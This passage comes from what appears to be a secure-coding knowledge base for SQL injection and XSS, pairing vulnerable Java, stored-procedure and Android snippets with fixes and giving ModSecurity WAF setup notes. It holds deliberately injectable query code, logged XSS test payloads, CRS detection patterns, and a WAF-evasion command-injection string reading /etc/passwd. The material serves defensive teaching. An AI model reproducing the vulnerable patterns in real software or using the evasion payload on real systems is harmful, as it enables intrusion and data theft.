(password.equals((String) user[0])) {\n\t\t\t\t\tloginBean.setRoleID((String) user[1]);\n\t\t\t\t\treturn &quot;success&quot;;\n\t\t\t\t} else {\n\t\t\t\t\treturn &quot;failure&quot;;\n\t\t\t\t}\n\t\t\t}\n\t\t} else {\n\t\t\treturn &quot;failure&quot;;\n\t\t}\n\t\t\n\t\treturn &quot;failure&quot;;\n\t}", "comments": "Parametrized query is usually recommended to solve SQLi vulnerabilities, due to the fact that the data and logic will be treated in separate channels by the DB server. Confidential information needs to be protected.", "impact": "For complex queries, validate with the DBA the performance impact in the overall DB.", "abstract": "Use of parametrized query"}, {"@type": "JAVA/JSP", "vulncode": "public String validateLogin(LoginBean loginBean){\n\t\t\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\n\n\t\tString uName = loginBean.getUserName();\n\t\tString password = loginBean.getPassword();\n\t\t\n\t\t<em class=\"red\">String hql =&quot;SELECT pwd from UserAccountEntity WHERE userName='&quot;+uName+&quot;'&quot;; </em>\n\t\t\n\t\tTypedQuery query = (TypedQuery) em.createQuery(hql);\n\t\t\n\t\tList&lt;Object[]&gt; results = query.getResultList();\n\t\t\n\t\tif (!results.isEmpty()) {\n\t\t\tIterator it = results.iterator();\n\t\t\twhile (it.hasNext()) {\n\t\t\t\tObject[] user = (Object[]) it.next();\n\n\t\t\t\tif (password.equals((String) user[0])) {\n\t\t\t\t\tloginBean.setRoleID((String) user[1]);\n\t\t\t\t\treturn &quot;success&quot;;\n\t\t\t\t} else {\n\t\t\t\t\treturn &quot;failure&quot;;\n\t\t\t\t}\n\t\t\t}\n\t\t} else {\n\t\t\treturn &quot;failure&quot;;\n\t\t}\n\t\t\n\t\treturn &quot;failure&quot;;\n\t}", "nonvulncode": "public String validateLogin(LoginBean loginBean){\n\t\t\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\n\n\t\tString uName = loginBean.getUserName();\n\t\tString password = loginBean.getPassword();\n\t\t\n\t\t<em class=\"blue\">CriteriaBuilder cb = em.getCriteriaBuilder();\n\tCriteriaQuery&lt;UserAccountEntity&gt; cr = cb.createQuery(UserAccountEntity.class);\n\tRoot&lt;UserAccountEntity&gt; root = cr.from(UserAccountEntity.class);\n\tcr.select(root).where(cb.equal(root.get(&quot;userName&quot;), uName));</em>\n\t\t\n\t\tTypedQuery query = (TypedQuery) em.createQuery(<em class=\"blue\">cr</em>);\n\t\tList&lt;<em class=\"blue\">UserAccountEntity</em>&gt; results = query.getResultList();\n\t\t\n\t\tif (!results.isEmpty()) {\n\t\t\tIterator it = results.iterator();\n\t\t\twhile (it.hasNext()) {\n\t\t\t\t<em class=\"blue\">UserAccountEntity</em> user = <em class=\"blue\">(UserAccountEntity</em>) it.next();\n\n\t\t\t\tif (password.equals((String) <em class=\"blue\">user.getPwd()</em>)) {\n\t\t\t\t\tloginBean.setRoleID((String) <em class=\"blue\">user.getRoleID()</em>);\n\t\t\t\t\treturn &quot;success&quot;;\n\t\t\t\t} else {\n\t\t\t\t\treturn &quot;failure&quot;;\n\t\t\t\t}\n\t\t\t}\n\t\t} else {\n\t\t\treturn &quot;failure&quot;;\n\t\t}\n\t\t\n\t\treturn &quot;failure&quot;;\n\t}", "comments": "The use of ORM objects, helps to stop SQL injection because it passes data to the database via SQL parameters instead of control layer. Queries are not possible to manipulate using the traditional concatenation of SQL scape characters (e.g. the single quote ' ), making it protected against traditional SQL injection attacks. \nReferences: \nhttps://developer.ibm.com/articles/j-typesafejpa/\nhttps://docs.oracle.com/javaee/6/tutorial/doc/gjivm.html\nhttps://software-security.sans.org/developer-how-to/fix-sql-injection-in-java-hibernate\nhttps://www.baeldung.com/sql-injection\nhttps://snyk.io/blog/sql-injection-orm-vulnerabilities/", "impact": "Primary advantage of using criteria API is , data can be manipulated without using any hard coded SQL/HQL.", "abstract": "Use of criteria API"}, {"@type": "SQL Stored Procedure", "vulncode": "private static string HelpdeskKPICalculation(SqlConnection con, SqlCommand cmd, int dashboardSize)\n        {\n            string jsonResult;\n            cmd.CommandText = &quot;<em class=\"red\">DS_Helpdesk_KPI</em>&quot; + (dashboardSize + 1);\n            using (SqlDataAdapter sda = new SqlDataAdapter(cmd))\n            {\n                DataTable dt = new DataTable();\n                sda.Fill(dt);\n                jsonResult = JsonConvert.SerializeObject(dt);\n            }\n            return jsonResult;\n        }", "nonvulncode": null, "comments": null, "impact": "Reference https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/", "abstract": "Use of stored procedure"}, {"@type": "PL/SQL", "vulncode": null, "nonvulncode": null, "comments": null, "impact": null, "abstract": null}, {"@type": "Android", "vulncode": "Public Cursor query(@Nullable Uri uri, @Nullable String[] projection, @Nullable String selection, @Nullable String[] selectionArgs, @Nullable String sortOrder) {\n                                Log.d(TAG,\\&quot;query Uri = \\&quot;+uri.toString());\n        SQLiteDatabase db = dbHelper.getWritableDatabase(getContext());\n \n        SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();\n        queryBuilder.setTables(SeiDbStructure.HistoryTable.HISTORY_TABLE_NAME);\n \n        uriMatcher.match(uri);\n \n       <em class=\"red\"> return queryBuilder.query(db, projection, selection, selectionArgs, null, null, sortOrder);</em>\n    }", "nonvulncode": "Public Cursor query(@Nullable Uri uri, @Nullable String[] projection, @Nullable String selection, @Nullable String[] selectionArgs, @Nullable String sortOrder) {\n                                Log.d(TAG,\\&quot;query Uri = \\&quot;+uri.toString());\n        SQLiteDatabase db = dbHelper.getWritableDatabase(getContext());\n \n        SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();\n        queryBuilder.setTables(SeiDbStructure.HistoryTable.HISTORY_TABLE_NAME);\n\t\t\n\t\t//sample selection: columnName = ? AND columnName &gt; ?\n\t\t<em class=\"blue\">queryBuilder. appendWhereEscapeString(selection)\n</em>\t\t\n        uriMatcher.match(uri);\n \n        return queryBuilder.query(db, projection,<em class=\"blue\"> null</em>, selectionArgs, null, null, sortOrder);\n    }", "comments": "Sanitizing where clause part of the query by html encoding the where clause to avoid sql injection via appendWhereEscapeString function. One thing to note is that the where clause should be created where the actual values are separated from the acutal where clause. See example below.\n\nExample:\nString selection = &quot;columnName1 = ? AND columnName2 = ?&quot;\nString[] selectionArgs = {&quot;value1&quot;, &quot;value2&quot;}", "impact": "No impact", "abstract": "Use of appendWhereEscapeString for sqlite query builder."}]}, "mitigations": {"mitigation": [{"system": "WAF / ModSecurity", "configuration": "web.config\nInsert the below code, right after the &lt;/configSections&gt; in the web.config file of the web application.\n\n&lt;system.webServer&gt;\n    &lt;ModSecurity enabled=&quot;true&quot; configFile=&quot;C:\\Program Files\\ModSecurity IIS\\modsecurity_iis.conf&quot; /&gt;\n&lt;/system.webServer&gt;\n\nThe value of the configFile must be the path on where the ModSecurity installed.", "backend": "- OWASP CRS must be downloaded and enabled. \n- Rules for Input Validation attack (must be present in the rules folder)\n   - REQUEST-941-APPLICATION-ATTACK-XSS.conf \n   - REQUEST-942-APPLICATION-ATTACK-SQLI.conf \n- Open the modsecurity.conf and update the SecRuleEngine to On.\n- Open the modsecurity_iis.conf and update the entry Include crs-setup.conf.example to Include crs-setup.conf", "frontend": "SIEM integration:\nWindows: Collect logs with Source as ModSecurity from eventviewer. Below is the log captured for SQL Injection.\n\n[client 10.0.1.163] ModSecurity: Warning. Pattern match &quot;&lt;(a|abbr|acronym|address|applet|...&quot; at ARGS:Username. [file &quot;C:\\/Program Files/ModSecurity IIS/owasp_crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;902&quot;] [id &quot;941320&quot;] [rev &quot;2&quot;] [msg &quot;Possible XSS Attack Detected - HTML Tag Handler&quot;] [data &quot;Matched Data: &lt;script&gt; found within ARGS:Username: &lt;script&gt;alert(1)&lt;/script&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.0.0&quot;] [maturity &quot;8&quot;] [accuracy &quot;8&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/XSS&quot;] [tag &quot;WASCTC/WASC-8&quot;] [tag &quot;WASCTC/WASC-22&quot;] [tag &quot;OWASP_TOP_10/A2&quot;] [tag &quot;OWASP_AppSensor/IE1&quot;] [tag &quot;PCI/6.5.1&quot;] [tag &quot;paranoia-level/2&quot;]\n\n[client 10.0.1.163] ModSecurity: Warning. Pattern match &quot;(?i:([\\\\s'\\&quot;`\\\\(\\\\)]*?)([\\\\d\\\\w]++)([\\\\s'\\&quot;`\\\\(\\\\)]*?)(?:(?:=|&lt;=&gt;|r?like|sounds\\\\s+like|regexp)([\\\\s'\\&quot;`\\\\(\\\\)]*?)\\\\2|(?:!=|&lt;=|&gt;=|&lt;&gt;|&lt;|&gt;|\\\\^|is\\\\s+not|not\\\\s+like|not\\\\s+regexp)([\\\\s'\\&quot;`\\\\(\\\\)]*?)(?!\\\\2)([\\\\d\\\\w]+)))&quot; at ARGS:Username. [file &quot;C:\\/Program Files/ModSecurity IIS/owasp_crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf&quot;] [line &quot;558&quot;] [id &quot;942130&quot;] [rev &quot;2&quot;] [msg &quot;SQL Injection Attack: SQL Tautology Detected.&quot;] [data &quot;Matched Data: script&gt;alert found within ARGS:Username: &lt;script&gt;alert(1)&lt;/script&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.0.0&quot;] [maturity &quot;9&quot;] [accuracy &quot;8&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-sqli&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&quot;] [tag &quot;WASCTC/WASC-19&quot;] [tag &quot;OWASP_TOP_10/A1&quot;] [tag &quot;OWASP_AppSensor/CIE1&quot;] [tag &quot;PCI/6.5.2&quot;] [tag &quot;paranoia-level/2&quot;] \n\n[client 10.0.1.163] ModSecurity: Warning. Pattern match &quot;(?i)&lt;[^\\\\w&lt;&gt;]*(?:[^&lt;&gt;\\&quot;'\\\\s]*:)?[^\\\\w&lt;&gt;]*...&quot; at ARGS:Username. [file &quot;C:\\/Program Files/ModSecurity IIS/owasp_crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;236&quot;] [id &quot;941160&quot;] [rev &quot;2&quot;] [msg &quot;NoScript XSS InjectionChecker: HTML Injection&quot;] [data &quot;Matched Data: &lt;script found within ARGS:Username: &lt;script&gt;alert(1)&lt;/script&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.0.0&quot;] [maturity &quot;1&quot;] [accuracy &quot;8&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/XSS&quot;] [tag &quot;WASCTC/WASC-8&quot;] [tag &quot;WASCTC/WASC-22&quot;] [tag &quot;OWASP_TOP_10/A3&quot;] [tag &quot;OWASP_AppSensor/IE1&quot;] [tag &quot;CAPEC-242&quot;]\n\n\n[client 10.0.1.163] ModSecurity: Warning. detected XSS using libinjection. [file &quot;C:\\/Program Files/ModSecurity IIS/owasp_crs/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;64&quot;] [id &quot;941100&quot;] [rev &quot;2&quot;] [msg &quot;XSS Attack Detected via libinjection&quot;] [data &quot;Matched Data: &lt;script&gt;alert(1)&lt;/script&gt; found within ARGS:Username: &lt;script&gt;alert(1)&lt;/script&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.0.0&quot;] [maturity &quot;1&quot;] [accuracy &quot;9&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/XSS&quot;] [tag &quot;WASCTC/WASC-8&quot;] [tag &quot;WASCTC/WASC-22&quot;] [tag &quot;OWASP_TOP_10/A3&quot;] [tag &quot;OWASP_AppSensor/IE1&quot;] [tag &quot;CAPEC-242&quot;]\n\n[client ] ModSecurity: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file &quot;C:\\/Program Files/ModSecurity IIS/owasp_crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf&quot;] [line &quot;57&quot;] [id &quot;949110&quot;] [msg &quot;Inbound Anomaly Score Exceeded (Total Score: 5)&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-generic&quot;] [hostname &quot;ALCB-749326Z-LX&quot;] [uri &quot;/Home/Login&quot;] [unique_id &quot;18014398524514369608&quot;]\n\n[client ::1] ModSecurity: Warning. detected XSS using libinjection. [file &quot;C:/Apache24/modules/mod_security2/activated_rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;59&quot;] [id &quot;941100&quot;] [msg &quot;XSS Attack Detected via libinjection&quot;] [data &quot;Matched Data: XSS data found within ARGS:arg: &lt;script&gt;alert('XSS attack!')&lt;/script&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.2.0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;OWASP_CRS&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/XSS&quot;] [tag &quot;WASCTC/WASC-8&quot;] [tag &quot;WASCTC/WASC-22&quot;] [tag &quot;OWASP_TOP_10/A3&quot;] [tag &quot;OWASP_AppSensor/IE1&quot;] [tag &quot;CAPEC-242&quot;] [unique_id &quot;X2yLUvhe6vKvULdjHQIjLQAAAD8&quot;]\n\n[client ::1] ModSecurity: Warning. Pattern match &quot;(?i:(?:&lt;\\\\\\\\w[\\\\\\\\s\\\\\\\\S]*[\\\\\\\\s\\\\\\\\/]|['\\\\&quot;](?:...&quot; at ARGS:arg. [file &quot;C:/Apache24/modules/mod_security2/activated_rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;218&quot;] [id &quot;941160&quot;] [msg &quot;NoScript XSS InjectionChecker: HTML Injection&quot;] [data &quot;Matched Data: &lt;script found within ARGS:arg: &lt;script&gt;alert('XSS attack!')&lt;/script&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.2.0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;OWASP_CRS&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/XSS&quot;] [tag &quot;WASCTC/WASC-8&quot;] [tag &quot;WASCTC/WASC-22&quot;] [tag &quot;OWASP_TOP_10/A3&quot;] [tag &quot;OWASP_AppSensor/IE1&quot;] [tag &quot;CAPEC-242&quot;] [hostname &quot;localhost&quot;]\n\n[client ::1] ModSecurity: Warning. Pattern match &quot;(?i)&lt;script[^&gt;]*&gt;[\\\\\\\\s\\\\\\\\S]*?&quot; at ARGS:arg. [file &quot;C:/Apache24/modules/mod_security2/activated_rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;90&quot;] [id &quot;941110&quot;] [msg &quot;XSS Filter - Category 1: Script Tag Vector&quot;] [data &quot;Matched Data: &lt;script&gt; found within ARGS:arg: &lt;script&gt;alert('XSS attack!')&lt;/script&gt;&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.2.0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;OWASP_CRS&quot;] [tag &quot;OWASP_CRS/WEB_ATTACK/XSS&quot;] [tag &quot;WASCTC/WASC-8&quot;] [tag &quot;WASCTC/WASC-22&quot;] [tag &quot;OWASP_TOP_10/A3&quot;] [tag &quot;OWASP_AppSensor/IE1&quot;] [tag &quot;CAPEC-242&quot;]", "comments": "WAF cannot be the only protection to prevent SQLi Attacks, and input validation procedures must be added to the code when possible. Use WAF as a defense in depth, adding another protection layer to sensitive applications when possible.\nFor ModSecurity, consider using OWASP Core Rule Set CRS https://coreruleset.org/documentation/\n\nIt is recommended to fix all XSS types of vulnerabilities in the code (e.g.,input sanitization and validation) and add WAF, CSP and X-XSS-Protection as a temporary mitigation, mechanisms to improve attack detection and extra protection layer to the web server. \nIn addition to WAF protection, DOM XSS attack can be prevented by using right output method at client side.\n\nWhen using WAF, CSP  and XSS-Protections as a temporary fix while the application is being fixed or to avoid some known/automated XSS attacks, the application team has to keep in mind that new attack vectors are constantly being created to try to bypass some of those controls. References on XSS attack vectors that may bypass the CSP/XSS/WAF rules: &lt;a href=&quot;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&quot; target=_blank&gt; https://portswigger.net/web-security/cross-site-scripting/cheat-sheet &lt;/a&gt;\n\nWAF can be used to log attempts and perform active defenses to block an on-going attack (e.g. block the attacker IP on the firewall).\n\nWAF cannot be the only protection to prevent XSS Attacks, and input validation procedures must be added to the code when possible.\n\nNote: Perform a full functional test is WAF is added, including on the test scripts all special characters scenarios that are expected to work (e.g., Spanish, Russian, etc. charsets, &lt;  &gt;  '   &quot; , ; & $  etc. when required by the application). WAF's do have a history of blocking those characters to prevent input injection, but this can affect the normal functionalities of the system.\nNote2: Remember there are methods to bypass WAF protections against SQLi (https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF), but it can be used to log attempts and perform active defenses to block an attacker (e.g. block the attacker IP on the firewall). \nNote3: CSP and X-XSS-Protection is a directive executed in the browser level, and the WAF protections are on the web server level. So logs generated by CSP/X-XSS-Protections are created on the user browser console and can not be imported by the SIEM tools. Logs generated by WAF can be imported by SIEM tools.\n\n\nPerform a full functional test is WAF is added, including on the test scripts all special characters scenarios that are expected to work (e.g., Spanish, Russian, etc. charsets, &lt;, &gt;, ', &quot;, etc. when required by the application). WAF's do have a history of blocking those characters to prevent input injection, but this can affect the normal functionalities of the system.\n\nRemember there are methods to bypass WAF protections against SQLi (https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF), but it can be used to log attempts and perform active defenses to block an attacker (e.g. block the attacker IP on the firewall)."}, {"system": "WAF / ModSecurity", "configuration": "web.config\nInsert the below code, right after the &lt;/configSections&gt; in the web.config file of the web application.\n\n&lt;system.webServer&gt;\n    &lt;ModSecurity enabled=&quot;true&quot; configFile=&quot;C:\\Program Files\\ModSecurity IIS\\modsecurity_iis.conf&quot; /&gt;\n&lt;/system.webServer&gt;\n\nThe value of the configFile must be the path on where the ModSecurity installed.", "backend": "- OWASP CRS must be downloaded and enabled. \n- Rules for remote code execution attack (must be present in the rules folder)\n- REQUEST-932-APPLICATION-ATTACK-RCE.conf\n- Open the modsecurity.conf and update the SecRuleEngine to On.\n- Open the modsecurity_iis.conf and update the entry Include crs-setup.conf.example to Include crs-setup.conf", "frontend": "SIEM integration:\nWindows: Collect logs with Source as ModSecurity from eventviewer. Below is the log captured for SQL Injection.\n\n(To be checked on EventLog: [client ] ModSecurity: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file &quot;C:\\/Program Files/ModSecurity IIS/owasp_crs/rules/REQUEST-.....conf&quot;] [line &quot;57&quot;] [id &quot;949110&quot;] [msg &quot;Inbound Anomaly Score Exceeded (Total Score: 5)&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-generic&quot;] [hostname &quot;ALCB-749326Z-LX&quot;] [uri &quot;/Home/Login&quot;] [unique_id &quot;18014398524514369608&quot;]\n\n\nLinux:", "comments": "Use WAF as a defense in depth, adding another protection layer to sensitive applications when possible.\n\nPerform a full functional test is WAF is added, including on the test scripts all special characters scenarios that are expected to work (e.g., Spanish, Russian, etc. charsets, &lt;  &gt;  '   &quot; , ; & $  etc. when required by the application). WAF's do have a history of blocking those characters to prevent input injection, but this can affect the normal functionalities of the system.\n\nRemember there are methods to bypass WAF protections against RCE (https://www.secjuice.com/web-application-firewall-waf-evasion/):\n10.10.10.1; cat$u+/etc$u/passwd$u -&gt; as $u is not initialized, it may bypass the WAF ruleset and have access to the file. \n\nWAF can be used to log attempts and perform active defenses to block an on-going attack (e.g. block the attacker IP on the firewall).\n\nWAF cannot be the only protection to prevent RCE Attacks, and input validation procedures must be added to the code when possible.\n\nFor ModSecurity, consider using OWASP Core Rule Set CRS https://coreruleset.org/documentation/"}]}}}}}}}